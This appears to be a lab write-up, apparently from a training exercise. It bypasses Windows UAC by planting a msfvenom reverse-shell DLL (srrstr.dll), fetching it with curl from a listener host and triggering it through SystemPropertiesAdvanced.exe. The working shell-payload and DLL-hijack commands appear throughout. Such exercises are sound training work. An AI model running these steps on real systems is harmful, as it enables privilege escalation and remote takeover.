# [User Account Control](User%20Account%20Control.md)
### Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished.

```cmd
net localgroup Administrator
```
![](Screenshot%202026-08-19%20at%2015.18.07.png)

Reviewing Users Privileges

```cmd 
whoami /priv
```
![](Screenshot%202026-08-19%20at%2015.19.16.png)

UAC is still enabled

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
![](Screenshot%202026-08-19%20at%2015.22.10.png)

Checking UAC level

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
![](Screenshot%202026-08-19%20at%2015.23.03.png)

Checked windows version
![](Screenshot%202026-08-19%20at%2015.23.59.png)

Created payload and transfered file

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.49 LPORT=8443 -f dll > srrstr.dll
```

```powershell
curl http://10.10.14.49:8443/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
![](Screenshot%202026-08-19%20at%2015.27.09.png)

Testing connection

```powershell
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
![](Screenshot%202026-08-19%20at%2015.27.57.png)

Executing SystemPropertiesAdvanced.exe on Target Host
![](Screenshot%202026-08-19%20at%2015.30.01.png)

Receiving the connection back

![](Screenshot%202026-08-19%20at%2015.31.30.png)
![](Screenshot%202026-08-19%20at%2015.30.59.png)